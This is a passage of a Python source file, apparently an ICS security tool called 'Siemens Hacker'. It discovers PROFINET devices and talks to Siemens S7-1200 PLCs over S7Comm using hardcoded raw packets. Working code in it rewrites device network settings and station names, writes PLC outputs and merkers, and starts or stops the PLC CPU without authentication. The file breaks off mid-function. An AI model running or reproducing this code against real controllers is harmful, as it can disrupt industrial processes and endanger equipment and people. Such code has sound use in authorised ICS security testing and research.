#! /usr/bin/env python
'''
	Copyright 2015 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        (Buggy) Linux implementation of this script: https://code.google.com/p/scada-tools/
        python profinet_scanner.py [-i interface]

        I scrupulously used code from this script: https://code.google.com/p/winpcapy/

        Prerequisites: WinPcap (Windows) or libpcap (Linux) installed
        
        File name SiemensScan.py
        written by tijl[dot]deneut[at]howest[dot]be
        --- Profinet Scanner ---
        It will perform a Layer2 discovery scan (PN_DCP) for Profinet devices,
        then list their info (detected only via DCP)
        Then give you the option to change network settings for any of them

        --- Siemens Hacker ---
        It also performs detailed scanning using S7Comm.
        Furthermore, this script reads inputs AND writes & reads outputs.
        (For now only S7-1200 with Basic Firmware <= 3 is tested)
'''
import os, sys, re, time, string, struct, socket
from subprocess import Popen, PIPE
import psutil
from multiprocessing.pool import ThreadPool
from binascii import hexlify, unhexlify
from ctypes import CDLL, POINTER, Structure, c_void_p, c_char_p, c_ushort, c_char, c_long, c_int, c_uint, c_ubyte, byref, create_string_buffer
from ctypes.util import find_library
try:
    import s7, modbus
    s7present = True
except:
    s7present = False
    pass

from scapy.all import *

##### Classes
class sockaddr(Structure):
    _fields_ = [("sa_family", c_ushort),
                ("sa_data", c_char * 14)]
class pcap_addr(Structure):
    pass
pcap_addr._fields_ = [('next', POINTER(pcap_addr)),
                      ('addr', POINTER(sockaddr)),
                      ('netmask', POINTER(sockaddr)),
                      ('broadaddr', POINTER(sockaddr)),
                      ('dstaddr', POINTER(sockaddr))]

class pcap_if(Structure):
    pass
pcap_if._fields_ = [('next', POINTER(pcap_if)),
                    ('name', c_char_p),
                    ('description', c_char_p),
                    ('addresses', POINTER(pcap_addr)),
                    ('flags', c_int)]
class timeval(Structure):
    pass
timeval._fields_ = [('tv_sec', c_long),
                    ('tv_usec', c_long)]
class pcap_pkthdr(Structure):
    _fields_ = [('ts', timeval),
                ('caplen', c_int),
                ('len', c_int)]

##### Initialize Pcap
if os.name == 'nt':
    try:
        _lib = CDLL('wpcap.dll')
    except:
        print('Error: WinPcap not found!')
        print('Please download here: https://www.winpcap.org/install')
        #raw_input('Press [Enter] to close')
        sys.exit(1)
else:
    pcaplibrary = find_library('pcap')
    if pcaplibrary == None or str(pcaplibrary) == '':
        print('Error: Pcap library not found!')
        print('Please install with: e.g. apt-get install libpcap0.8')
        #raw_input('Press [Enter] to close')
        sys.exit(1)
    _lib = CDLL(pcaplibrary)

## match DLL function to list all devices
pcap_findalldevs = _lib.pcap_findalldevs
pcap_findalldevs.restype = c_int
pcap_findalldevs.argtypes = [POINTER(POINTER(pcap_if)), c_char_p]
## match DLL function to open a device
pcap_open_live = _lib.pcap_open_live
pcap_open_live.restype = POINTER(c_void_p)
pcap_open_live.argtypes = [c_char_p, c_int, c_int, c_int, c_char_p]
## match DLL function to send a raw packet
pcap_sendpacket = _lib.pcap_sendpacket
pcap_sendpacket.restype = c_int
pcap_sendpacket.argtypes = [POINTER(c_void_p), POINTER(c_ubyte), c_int]
## match DLL function to close a device
pcap_close = _lib.pcap_close
pcap_close.restype = None
pcap_close.argtypes = [POINTER(c_void_p)]
## match DLL function to get error message
pcap_geterr = _lib.pcap_geterr
pcap_geterr.restype = c_char_p
pcap_geterr.argtypes = [POINTER(c_void_p)]
## match DLL function to get next packet
pcap_next_ex = _lib.pcap_next_ex
pcap_next_ex.restype = c_int
pcap_next_ex.argtypes = [POINTER(c_void_p), POINTER(POINTER(pcap_pkthdr)), POINTER(POINTER(c_ubyte))]


##### Functions
def getAllInterfaces():
    def addToArr(array, adapter, ip, mac, device, winguid):
        if len(mac) == 17: # When no or bad MAC address (e.g. PPP adapter), do not add
            array.append([adapter, ip, mac, device, winguid])
        return array

    # Returns twodimensional array of interfaces in this sequence for each interface:
    # [0] = adaptername (e.g. Ethernet or eth0)
    # [1] = Current IP (e.g. 192.168.0.2)
    # [2] = Current MAC (e.g. ff:ee:dd:cc:bb:aa)
    # [3] = Devicename (e.g. Intel 82575LM, Windows only)
    # [4] = DeviceGUID (e.g. {875F7EDB-CA23-435E-8E9E-DFC9E3314C55}, Windows only)
    netcard_info = []
    info = psutil.net_if_addrs()
    for k, v in info.items():
        ninfo = ['', '', '', '', '']
        ninfo[0] = k
        for item in v:
            if item[1] == '127.0.0.1':
                break
            if item[0] == 2:
                ninfo[1] = item[1]
            else:
                ninfo[2] = item[1]

        if ninfo[1] == '':
            continue

        netcard_info.append(ninfo)

    return netcard_info

## Listing all NPF adapters and finding the correct one that has the Windows Devicename (\Device\NPF_{GUID})
def findMatchingNPFDevice(windevicename):
    alldevs = POINTER(pcap_if)()
    errbuf = create_string_buffer(256)
    if pcap_findalldevs(byref(alldevs), errbuf) == -1:
        print ("Error in pcap_findalldevs: %s\n" % errbuf.value)
        sys.exit(1)
    pcapdevices = alldevs.contents
    while pcapdevices:
        if str(pcapdevices.description) == windevicename:
            return pcapdevices.name
        if pcapdevices.next:
            pcapdevices = pcapdevices.next.contents
        else:
            pcapdevices = False
    return ''

## Expects hexstring like this 01020304050607 and returns bytearray
def createPacket(string):
    hexstring = unhexlify(string)
    packet = (c_ubyte * len(hexstring))()
    b = bytearray()
    b.extend(hexstring)
    for i in range(0,len(hexstring)):
        packet[i] = b[i]
    return packet

## Actually sends a packet
def sendRawPacket(npfdevice, ethertype, srcmac, setNetwork=False, networkDataToSet='', dstmac=''):
    if ethertype == '88cc': # LLDP Packet
        dstmac = '0180c200000e'
        data = '0210077365727665722d6e6574776f726b6d040907706f72742d303031060200140a0f5345525645522d4e4554574f524b4d0c60564d776172652c20496e632e20564d77617265205669727475616c20506c6174666f726d2c4e6f6e652c564d776172652d34322033362036642039622034302062642038642038302d66302037362061312066302035332030392039352032370e040080008010140501ac101e660200000001082b0601040181c06efe08000ecf0200000000fe0a000ecf05005056b6feb6fe0900120f0103ec0300000000'
    elif ethertype == '8100': # PN-DCP, Profinet Discovery Packet, ethertype '8100'
        dstmac = '010ecf000000'
        data = '00008892fefe05000400000300800004ffff00000000000000000000000000000000000000000000000000000000'
    elif ethertype == '8892' and setNetwork:
        ## Create packet to set networkdata, expect data in hexstring
        data = ('fefd 04 00 04000001 0000 0012 0102 000e 0001' + networkDataToSet + '0000 0000 0000 0000 0000 0000').replace(' ','') # Working
    elif ethertype == '8892' and not setNetwork:
        ## Create custom packet with 'networkDataToSet' as the data (including length) and dstmac as dstmac
        data = networkDataToSet

    ## Get packet as a bytearray
    packet = createPacket(dstmac + srcmac + ethertype + data)

    ## Send the packet
    fp = c_void_p
    errbuf = create_string_buffer(256)
    fp = pcap_open_live(npfdevice, 65535, 1, 1000, errbuf)
    if not bool(fp):
        print("\nUnable to open the adapter. %s is not supported by Pcap\n" % interfaces[int(answer - 1)][0])
        sys.exit(1)

    if pcap_sendpacket(fp, packet, len(packet)) != 0:
        print ("\nError sending the packet: %s\n" % pcap_geterr(fp))
        sys.exit(1)

    pcap_close(fp)
    return packet

## Receive packets, expect device to receive on, src mac address + ethertype to filter on and timeout in seconds
def receiveRawPackets(npfdevice, timeout, srcmac, ethertype, stopOnReceive=False):
    receivedRawData = []
    fp = c_void_p
    errbuf = create_string_buffer(256)
    fp = pcap_open_live(npfdevice, 65535, 1, 1000, errbuf)
    if not bool(fp):
        print("\nUnable to open the adapter. %s is not supported by Pcap\n" % interfaces[int(answer - 1)][0])
        sys.exit(1)

    header = POINTER(pcap_pkthdr)()
    pkt_data = POINTER(c_ubyte)()
    receivedpacket = pcap_next_ex(fp, byref(header), byref(pkt_data))
    ## Regular handler, loop until told otherwise (or with timer)
    timer = time.time() + int(timeout)
    i = 0
    while receivedpacket >= 0:
        timeleft = int(round(timer - time.time(), 0))
        status("Received packets: %s, time left: %i  \r" % (str(i), timeleft))
        if receivedpacket == 0 or timeleft == 0:
            # PCAP networkstack timeout elapsed or regular timeout
            break
        rawdata = pkt_data[0:header.contents.len]
        packettype = hexlify(bytearray(rawdata[12:14])).lower()
        targetmac = hexlify(bytearray(rawdata[:6])).lower()
        if packettype == ethertype.lower() and srcmac.lower() == targetmac:
            #print('Succes! Found an ' + ethertype + ' packet                          ')
            receivedRawData.append(rawdata)
            if stopOnReceive: break

        ## Load next packet
        receivedpacket = pcap_next_ex(fp, byref(header), byref(pkt_data))
        i += 1
    pcap_close(fp)
    return receivedRawData

## Parsing the Raw PN_DCP data on discovery (source: https://code.google.com/p/scada-tools/source/browse/profinet_scanner.py)
## Returns type_of_station, name_of_station, vendor_id, device_id, device_role, ip_address, subnet_mask, standard_gateway
def parseResponse(data, mac):
    result = {}
    result['mac_address'] = mac
    result['type_of_station'] = 'None'
    result['name_of_station'] = 'None'
    result['vendor_id'] = 'None'
    result['device_id'] = 'None'
    result['device_role'] = 'None'
    result['ip_address'] = 'None'
    result['subnet_mask'] = 'None'
    result['standard_gateway'] = 'None'
    ## Since this is the parse of a DCP identify response, data should start with feff (Profinet FrameID 0xFEFF)
    if not str(data[:4]).lower() == 'feff':
        print('Error: this data is not a proper DCP response?')
        return result
    
    dataToParse = data[24:] # (Static) offset to where first block starts
    while len(dataToParse) > 0:
        ## Data is divided into blocks, where block length is set at byte 2 & 3 (so offset [4:8]) of the block
        blockLength = int(dataToParse[2*2:4*2], 16)
        block = dataToParse[:(4 + blockLength)*2]

        ## Parse the block
        blockID = str(block[:2*2])
        if blockID == '0201':
            result['type_of_station'] = str(unhexlify(block[4*2:4*2 + blockLength*2]))[2:]
        elif blockID == '0202':
            result['name_of_station'] = str(unhexlify(block[4*2:4*2 + blockLength*2]))[2:]
        elif blockID == '0203':
            result['vendor_id'] = str(block[6*2:8*2])
            result['device_id'] = str(block[8*2:10*2])
        elif blockID == '0204':
            result['device_role'] = str(block[6*2:7*2])
            devrole = ''
            
        elif blockID == '0102':
            result['ip_address'] = socket.inet_ntoa(struct.pack(">L", int(block[6*2:10*2], 16)))
            result['subnet_mask'] = socket.inet_ntoa(struct.pack(">L", int(block[10*2:14*2], 16)))
            result['standard_gateway'] = socket.inet_ntoa(struct.pack(">L", int(block[14*2:18*2], 16)))
        
        ## Maintain the loop
        padding = blockLength%2 # Will return 1 if odd
        dataToParse = dataToParse[(4 + blockLength + padding)*2:]
        
    return result
        
def status(msg):
    sys.stderr.write(msg)
    sys.stderr.flush()

def endIt(sMessage=''):
    print
    if sMessage: print('Error message: '+sMessage)
    print('All done')
    #raw_input('Press ENTER to continue')
    sys.exit()

def scanPort(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1) # 1 second timeout
    try:
        sock.connect((ip, port))
        sock.close()
    except:
        return ''
    return port

def tcpScan(device, scanOnly = False):
    openports = []
    if scanPort(device['ip_address'], 102) == 102:
        openports.append(102)
        if not scanOnly:
            s7.Scan(device['ip_address'], 102)
    if scanPort(device['ip_address'], 502) == 502:
        openports.append(502)
        if not scanOnly:
            modbus.Scan(device['ip_address'], 502)
    device['open_ports'] = openports
    return device

def getInfo(device):
    #os.system('cls' if os.name == 'nt' else 'clear')
    # Try to parse id to a readable format (source: Wireshark)
    vendorid = 'Unknown ID'
    devid = 'Unknown ID'
    devrole = ''
    if device['vendor_id'] == '002a': vendorid = 'Siemens'
    if device['device_id'] == '0a01': devid = 'Switch'
    elif device['device_id'] == '0202': devid = 'PCSIM'
    elif device['device_id'] == '0203': devid = 'S7-300 CP'
    elif device['device_id'] == '0101': devid = 'S7-300'
    elif device['device_id'] == '010d': devid = 'S7-1200'
    elif device['device_id'] == '0301': devid = 'HMI'
    elif device['device_id'] == '010b': devid = 'ET200S'
    binresult = bin(int(device['device_role'], 16))[2:]
    if int(binresult) & 1 == 1: devrole += 'IO-Device '
    if int(binresult) & 10 == 10: devrole += 'IO-Controller '
    if int(binresult) & 100 == 100: devrole += 'IO-Multidevice '
    if int(binresult) & 1000 == 1000: devrole += 'PN-Supervisor '
    print('               ###--- DEVICE INFO ---###')
    print('--------- INFORMATION GATHERED THROUGH PN_CDP -------------')
    print('Mac Address:      ' + device['mac_address'])
    print('Type of station:  ' + device['type_of_station'])
    print('Name of station:  ' + device['name_of_station'])
    print('Vendor ID:        ' + device['vendor_id'] + ' (decoded: ' + vendorid + ')')
    print('Device ID:        ' + device['device_id'] + ' (decoded: ' + devid + ')')
    print('Device Role:      ' + device['device_role'] + '   (decoded: ' + devrole + ')')
    print('IP Address:       ' + device['ip_address'])
    print('Subnetmask:       ' + device['subnet_mask'])
    print('Standard Gateway: ' + device['standard_gateway'])
    print
    ## TCP port scan
    if s7present:
        print('------ INFORMATION GATHERED THROUGH TCPIP (plcscan) -------')
        device = tcpScan(device)
    else:
        print('------ INFORMATION GATHERED THROUGH TCPIP (DIRECT) --------')
        getInfoViaCOTP(device)
        print('')
        print(' --> CPU State: '+getCPU(device)+'\n')
    #raw_input('Press [Enter] to return to the menu')
    return device

def isIpv4(ip):
    match = re.match("^(\d{0,3})\.(\d{0,3})\.(\d{0,3})\.(\d{0,3})$", ip)
    if not match:
        return False
    quad = []
    for number in match.groups():
        quad.append(int(number))
    if quad[0] < 1:
        return False
    for number in quad:
	if number > 255 or number < 0:
            return False
    return True

def setNetwork(device, npfdevice, srcmac):
    def ipToHex(ipstr):
        iphexstr = ''
        for s in ipstr.split('.'):
            if len(hex(int(s))[2:]) == 1:
                iphexstr += '0'
            iphexstr += str(hex(int(s))[2:])
        return iphexstr
    
    #os.system('cls' if os.name == 'nt' else 'clear')
    print('      ###--- DEVICE NETWORK CONFIG ---###')
    newip = raw_input('Provide the new IP address ['+device['ip_address']+']     : ')
    if newip == '': newip = device['ip_address']
    newsnm = raw_input('Provide the new subnet mask ['+device['subnet_mask']+']    : ')
    if newsnm == '': newsnm = device['subnet_mask']
    newgw = raw_input('Provide the new standard gateway ['+device['standard_gateway']+']: ')
    if newgw == '': newgw = device['standard_gateway']
    if not isIpv4(newip) or not isIpv4(newsnm) or not isIpv4(newgw):
        print('One or more addresses were wrong. \nPlease go read RFC 791 and then use a legitimate IPv4 address.')
        raw_input('')
        return device
    networkdata = ipToHex(newip) + ipToHex(newsnm) + ipToHex(newgw)
    print('Hold on, crafting packet...')
    print

    ## First start a background capture to capture the reply
    scan_response = ''
    pool = ThreadPool(processes=1)
    async_result = pool.apply_async(receiveRawPackets, (npfdevice, 2, srcmac, '8892', True))
    time.sleep(1) # Give thread time to start

    ## Send packet
    sendRawPacket(npfdevice, '8892', srcmac, True, networkdata, device['mac_address'].replace(':', ''))

    ## Check if response is OK
    data = hexlify(bytearray(async_result.get()[0]))[28:]
    responsecode = str(data[36:40])
    if responsecode == '0000':
        print('Successfully set new networkdata!                     ')
        device['ip_address'] = newip
        device['subnet_mask'] = newsnm
        device['standard_gateway'] = newgw
    elif responsecode == '0600':
        print('Error setting networkdata: device in operation.       ')
    elif responsecode == '0300':
        print('Error setting networkdata: function not implemented.  ')
    else:
        print('Undefined response (' + responsecode + '), please investigate.        ')
    
    #raw_input('Press [Enter] to return to the device menu')
    return device

def setStationName(device, npfdevice, srcmac):
    #os.system('cls' if os.name == 'nt' else 'clear')
    print('      ###--- DEVICE NETWORK CONFIG ---###')
    print('Attention: Only lower case letters and the \'-\' symbol are allowed!')
    newname = raw_input('Provide the new name ['+device['name_of_station']+']     : ')
    if newname == '': newname = device['name_of_station']
    
    ## First start a background capture to capture the reply
    scan_response = ''
    pool = ThreadPool(processes=1)
    async_result = pool.apply_async(receiveRawPackets, (npfdevice, 2, srcmac, '8892', True))
    time.sleep(1) # Give thread time to start

    ## Send packet length, PN_DCP SET (04), Request (00), DeviceName-Xid (02010004), Padding (0000), DCPLength (0012 or d18)
    ##  Device Properties (02), NameOfStation (02), DCPLength (000d or d13), BlockQualifier (0001), NameItself (11 byte), Padding (00)
    ##  Padding (to get to 60 bytes?)
    nname=hexlify(newname.lower())
    namelength=len(nname)/2
    padding = ''
    if namelength%2 == 1: padding = '00'
    firstDCP = hex(namelength+(len(padding)/2)+6)[2:]
    if len(firstDCP) == 1: firstDCP='000'+firstDCP
    if len(firstDCP) == 2: firstDCP='00'+firstDCP
    if len(firstDCP) == 3: firstDCP='0'+firstDCP
    secondDCP = hex(namelength+2)[2:]
    if len(secondDCP) == 1: secondDCP='000'+secondDCP
    if len(secondDCP) == 2: secondDCP='00'+secondDCP
    if len(secondDCP) == 3: secondDCP='0'+secondDCP
    data='fefd 04 00 02010004 0000'
    #data+='0012'## Change this (length of name+padding+5)
    data+=firstDCP
    data+='02 02'
    #data+='000d'## Change this (length of name)
    data+=secondDCP
    data+='0001'
    #data+='7869616b64656d6f706c63 00' #xiakdemoplc (11 characters), Change this
    data+=nname+padding
    data+='00000000000000000000000000000000' ## Padding to get to 60 bytes, Change this
    
    sendRawPacket(npfdevice, '8892', srcmac, False, data.replace(' ',''), device['mac_address'].replace(':', ''))

    ## Check if response is OK
    data = hexlify(bytearray(async_result.get()[0]))[28:]
    responsecode = str(data[36:38])
    if responsecode == '00':
        print('Successfully set new Station Name to '+newname)
        device['name_of_station']=newname
    elif responsecode == '03':
        print('Error setting Station Name: Name Not Accepted!')
        print(data)

    #raw_input('Press [Enter] to return to the device menu')
    return device

def send_and_recv(sock, strdata, sendOnly = False):
    data = unhexlify(strdata.replace(' ','').lower()) ## Convert to real HEX (\x00\x00 ...)
    sock.send(data)
    if sendOnly: return
    ret = sock.recv(65000)
    return ret

def getS7GetCoils(ip):
    def printData(sWhat, s7Response): ## Expects 4 byte hex data (e.g. 00000000)
        if not s7Response[18:20] == '00': finish('Some error occured with S7Comm Setup, full response: ' + str(s7Response) + '\n')
        s7Data = s7Response[14:]
        datalength = int(s7Data[16:20], 16) ## Normally 5 bytes for a byte, 6 if we request word, 8 if we request real
        s7Items = s7Data[28:28 + datalength*2]
        if not s7Items[:2] == 'ff': finish('Some error occured with S7Comm Data Read, full S7Comm data: ' + str(s7Data) + '\nFirmware not supported?\n')
    
        print('     ###--- ' + sWhat + ' ---###')
        sToShow = [''] * 8
        for i in range(0,4):
            iOffset1 = (4 - i) * -2
            iOffset2 = iOffset1 + 2
            if iOffset2 == 0: iOffset2 = None
            iData = int(s7Items[iOffset1:iOffset2], 16) ## Now we have e.g. 02, which is 00000010

            for j in range(0,8):
                ## Performing binary and of the inputs AND 2^1 to get value of last bit
                bVal = iData & int(2**j)
                if not bVal == 0: bVal = 1
                sToShow[j] = sToShow[j] +  str(i) + '.' + str(j) + ': ' + str(bVal) + ' | ' 
        for i in range(0,8): print(sToShow[i][:-2])
        print('')

    sock = setupConnection(ip, 102)

    ## First 4 bytes are TPKT (last byte==datalength), next 3 bytes are COTP, last 24 bytes are S7Comm Read Var.
    ##   Request Byte (02) or Word (04) or Dword (06)
    ##   '81' means read inputs (I)
    ##   '000000' means starting at Address 0 (I think)
    
    ## Get Inputs in Dword (so 32 inputs) starting from Address 0
    s7Response = hexlify(send_and_recv(sock, '0300001f' + '02f080' + '32010000732f000e00000401120a10 06 00010000 81 000000'.replace(' ','')))
    printData('Inputs',s7Response)

    ## Outputs (82)
    s7Response = hexlify(send_and_recv(sock, '0300001f' + '02f080' + '32010000732f000e00000401120a10 06 00010000 82 000000'.replace(' ','')))
    printData('Outputs',s7Response)

    ## Merkers (83)
    s7Response = hexlify(send_and_recv(sock, '0300001f' + '02f080' + '32010000732f000e00000401120a10 06 00010000 83 000000'.replace(' ','')))
    printData('Merkers',s7Response)
    sock.close()

def setupConnection(sIP, iPort):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    sock.connect((sIP, iPort))
    ## Always start with a COTP CR (Connection Request), we need a CS (Connection Success) back
    cotpsync = hexlify(send_and_recv(sock, '03000016' + '11e00000000100c0010ac1020100c2020101'))
    if not cotpsync[10:12] == 'd0': finish('COTP Sync failed, PLC not reachable?')
    ## First 4 bytes are TPKT (last byte==datalength), next 3 bytes are COTP, last 18 bytes are S7Comm Setup Communication
    s7comsetup = hexlify(send_and_recv(sock, '03000019' + '02f080' + '32010000722f00080000f0000001000101e0'))
    if not s7comsetup[18:20] == '00': finish('Some error occured with S7Comm setup, full data: ' + s7comsetup)
    return sock

def setOutputs(sIP, iPort, sOutputs):
    if sOutputs == '' or len(sOutputs) > 8: sOutputs = '0'
    ## Outputs need to be reversed before sending: ('11001000' must become '00010011')
    sOutputs = sOutputs[::-1]
    ## Converted to hexstring ('00010011' becomes '13')
    hexstring = hex(int(sOutputs, 2))[2:]
    if len(hexstring) == 1: hexstring = '0' + hexstring # Add leading zero
    
    ## Setup the connection
    sock = setupConnection(sIP, iPort)

    ## Set Outputs
    ## First 4 bytes are TPKT (last byte==datalength), next 3 bytes are COTP, last 24 bytes are S7Comm Set Var, last byte contains data to send!
    s7Response = hexlify(send_and_recv(sock, '03000024' + '02f080' + '32010000732f000e00050501120a1002000100008200000000040008' + hexstring))
    if s7Response[-2:] == 'ff': print('Writing Outputs successful')
    else: print('Error writing outputs.')
    sock.close()

def setMerkers(sIP, iPort, sMerkers, iMerkerOffset=0):
    ## Outputs need to be reversed before sending: ('11001000' must become '00010011')
    sMerkers = sMerkers[::-1]
    ## Converted to hexstring ('00010011' becomes '13')
    hexstring = hex(int(sMerkers, 2))[2:]
    if len(hexstring) == 1: hexstring = '0' + hexstring # Add leading zero
    
    ## Setup the connection
    sock = setupConnection(sIP, iPort)

    ## Set Merkers
    ## First 4 bytes are TPKT (last byte==datalength), next 3 bytes are COTP, last bytes are S7Comm Write Var, '83' is Merker, last bytes contain data to send!
    # '320100000800000e00080501120a1006000100008300000000040020 00070000'
    ## '83' is merkers
    ## '000000' is address (address 9 = 000048 => '1001' + '000' = 0100 1000 = 0x48)
    ## 04 is WORD (so 2 bytes in the end)
    
    ## Convert iMerkerOffset to BIN, add '000' and convert back to HEX
    sMerkerOffset = bin(iMerkerOffset)
    sMerkerOffset = sMerkerOffset + '000'
    hMerkerOffset = str(hex(int(sMerkerOffset[2:],2)))[2:]
    hMerkerOffset = hMerkerOffset.zfill(6) ## Add leading zero's up to 6
    print('Sending '+hexstring+' using offset '+hMerkerOffset)

    s7Response = hexlify(send_and_recv(sock, '03000025' + '02f080' + '320100001500000e00060501120a100400010000 83 ' + hMerkerOffset + '00 04 0010' + hexstring + '00'))
    if s7Response[-2:] == 'ff': print('Writing Merkers successful')
    else: print('Error writing merkers.')
    sock.close()

def manageOutputs1(device):
    status = ''

    ports = []
    #os.system('cls' if os.name == 'nt' else 'clear')
    print('      ###--- Manage Outputs ---###')
    if status != '':
        print('## --> ' + status)
        status = ''
    print
    try:
        ports = device['open_ports']
    except:
        print('Scanning the device first.')
        device = tcpScan(device, True)
        ports = device['open_ports']
    if len(ports) == 0: return 1
    for port in ports:
        if port == 102:
            print('S7Comm (Siemens) detected, getting outputs...')
            getS7GetCoils(device['ip_address'])
        else: return 1
    #raw_input('Press [Enter] to return to the device menu')

def changeOutputs(device,arr_tmp):
    status = ''

    ports = []
    #os.system('cls' if os.name == 'nt' else 'clear')
    print('      ###--- Manage Outputs ---###')
    if status != '':
        print('## --> ' + status)
        status = ''
    print
    try:
        ports = device['open_ports']
    except:
        print('Scanning the device first.')
        device = tcpScan(device, True)
        ports = device['open_ports']
    if len(ports) == 0: return 1
    for port in ports:
        if port == 102:
            print('S7Comm (Siemens) detected, getting outputs...')
            setOutputs(device['ip_address'], 102, arr_tmp)
            getS7GetCoils(device['ip_address'])
            status = 'Output has been send to device, verifying results: '
        else: return 1
    #raw_input('Press [Enter] to return to the device menu')

def flashLED(npf, device, srcmac, duration):
    print "x"*20
    print npf,device['name_of_station'],srcmac,device['mac_address']
    print "x"*20

    runLoop = True
    i = 0
    while runLoop:
        #os.system('cls' if os.name == 'nt' else 'clear')
        print('     ###--- Flashing LED ---###')
        print 'Flashing LED of '+device['name_of_station']+', '+str(i)+' out of '+str(duration)+ ' seconds.'

        ## Send packet (length, PN_DCP SET (04), Request (00), LED-Xid (00001912), DCPLength (8), Control (5), Signal (3), DCPLength (4), Undecoded (0100)
        data='fefd 040000001912000000080503000400000100 000000000000000000000000000000000000000000000000000000000000'
        sendRawPacket(npf, '8892', srcmac, False, data.replace(' ',''), device['mac_address'].replace(':', ''))
        
        i+=2
        if i > duration:
            runLoop = False
        time.sleep(2)
        
        
def getInfoViaCOTP(device):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1) # 1 second timeout
    sock.connect((device['ip_address'], 102)) ## Will setup TCP/SYN with port 102
    cotpconnectresponse = hexlify(send_and_recv(sock, '03000016'+'11e00000000500c1020600c2020600c0010a'))
    if not cotpconnectresponse[10:12] == 'd0':
        print('COTP Connection Request failed, no route to IP '+device['ip_address']+'?')
        return []

    data = '720100b131000004ca0000000200000120360000011d00040000000000a1000000d3821f0000a3816900151653657276657253657373696f6e5f3742363743433341a3822100150b313a3a3a362e303a3a3a12a3822800150d4f4d532b204465627567676572a38229001500a3822a001500a3822b00048480808000a3822c001211e1a304a3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
    tpktlength = str(hex((len(data)+14)/2))[2:] ## Dynamically find out the data length
    cotpdata = send_and_recv(sock, '030000'+tpktlength+'02f080'+data)

    ## It is sure that the CPU state is NOT in this response
    print('Hardware: '+cotpdata.split(';')[2])
    print('Firmware: '+filter(lambda x: x in string.printable, cotpdata.split(';')[3].replace('@','.')))

    sock.close()

def manageCPU(device):
    runLoop = True

    #os.system('cls' if os.name == 'nt' else 'clear')
    print('     ###--- Manage CPU ---###\n')
    print('Current CPU state: '+getCPU(device))
    print('This will take some seconds ...')
    changeCPU(device)

        

def getCPU(device):
    sState = 'Running'
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1) # 1 second timeout
    sock.connect((device['ip_address'], 102)) ## Will setup TCP/SYN with port 102
    # Firstly: the COTP Connection Request (CR), should result in Connection Confirm (CC)
    ## TPKT header + COTP CR TPDU with src-ref 0x0005 (gets response with dst-ref 0x0005)
    cotpconnectresponse = hexlify(send_and_recv(sock, '03000016'+'11e00000001d00c1020100c2020100c0010a'))
    ## Response should be 03000016 11d00005001000c0010ac1020600c2020600
    if not cotpconnectresponse[10:12] == 'd0':
        print 'COTP Connection Request failed'
        return
    ##---- S7 Setup Comm ------------
    ## TPKT header + COTP header + S7 data (which is: Header -Job- + Parameter -Setup-)
    s7setupdata='32010000020000080000'+'f0000001000101e0'
    tpktlength = str(hex((len(s7setupdata)+14)/2))[2:]
    s7setup = send_and_recv(sock, '030000'+tpktlength+'02f080'+s7setupdata)
    ##---- S7 Request CPU -----------
    s7readdata = '3207000005000008 000800011204 11440100ff09000404240001'
    tpktlength = str(hex((len(s7readdata.replace(' ',''))+14)/2))[2:]
    s7read = send_and_recv(sock,'030000'+tpktlength+'02f080'+s7readdata)
    if hexlify(s7read[44:45]) == '03': sState = 'Stopped'
    sock.close()
    return sState

def changeCPU(device):
    curState = getCPU(device)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    sock.connect((device['ip_address'], 102)) ## Will setup TCP/SYN with port 102
    ## CR TPDU
    send_and_recv(sock,'03000016'+'11e00000002500c1020600c2020600c0010a')
    ## 'SubscriptionContainer'
    sResp = hexlify(send_and_recv(sock,'030000c0'+'02f080'+'720100b131000004ca0000000200000120360000011d00040000000000a1000000d3821f0000a3816900151653657276657253657373696f6e5f4536463534383534a3822100150b313a3a3a362e303a3a3a12a3822800150d4f4d532b204465627567676572a38229001500a3822a001500a3822b00048480808000a3822c001211e1a300a3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'))
    sSID = str(hex(int(sResp[48:50],16)+int('80',16))).replace('0x','')
    if curState == 'Stopped': ## Will perform start
        send_and_recv(sock,'03000078'+'02f080'+'72020069310000054200000003000003'+sSID+'34000003 ce 010182320100170000013a823b00048140823c00048140823d000400823e00048480c040823f0015008240001506323b313035388241000300030000000004e88969001200000000896a001300896b000400000000000072020000')
    else:
        send_and_recv(sock,'03000078'+'02f080'+'72020069310000054200000003000003'+sSID+'34000003 88 010182320100170000013a823b00048140823c00048140823d000400823e00048480c040823f0015008240001506323b313035388241000300030000000004e88969001200000000896a001300896b000400000000000072020000')
    send_and_recv(sock,'0300002b'+'02f080'+'7202001c31000004bb00000005000003'+sSID+'34000000010000000000000000000072020000')
    send_and_recv(sock,'0300002b'+'02f080'+'7202001c31000004bb00000006000003'+sSID+'34000000020001010000000000000072020000')
    runloop = True
    print('--- Getting data ---')
    while runloop:
        try: response = sock.recv(65000)
        except: runloop = False
    send_and_recv(sock,'03000042'+'02f080'+'7202003331000004fc00000007000003'+sSID+'360000003402913d9b1e000004e88969001200000000896a001300896b00040000000000000072020000')
    if curState == 'Stopped': ## Will perform start
        send_and_recv(sock,'03000043'+'02f080'+'7202003431000004f200000008000003'+sSID+'36000000340190770008 03 000004e88969001200000000896a001300896b00040000000000000072020000')
    else:
        send_and_recv(sock,'03000043'+'02f080'+'7202003431000004f200000008000003'+sSID+'36000000340190770008 01 000004e88969001200000000896a001300896b00040000000000000072020000')
    send_and_recv(sock,'0300003d'+'02f080'+'7202002e31000004d40000000a000003'+sSID+'34000003d000000004e88969001200000000896a001300896b000400000000000072020000')
    
    sock.close()
    return

def getMac(ip, iface):
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2, iface=iface)
    for s,r in ans:
